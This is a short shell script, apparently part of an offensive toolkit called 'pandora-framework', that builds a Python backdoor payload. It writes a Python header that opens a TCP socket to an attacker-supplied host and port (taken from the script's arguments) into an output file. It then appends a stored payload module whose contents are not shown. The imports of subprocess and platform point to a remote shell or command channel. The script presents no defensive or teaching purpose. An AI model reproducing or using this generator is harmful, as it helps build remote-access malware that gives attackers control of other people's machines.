echo "
import socket
import os
import subprocess
import platform

def connect():
    os.system('clear')
    global host
    global port
    global s
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    host ='$1'
    port = $2

" > $3
cat ~/pandora-framework/pandora/modules/payload >> $3
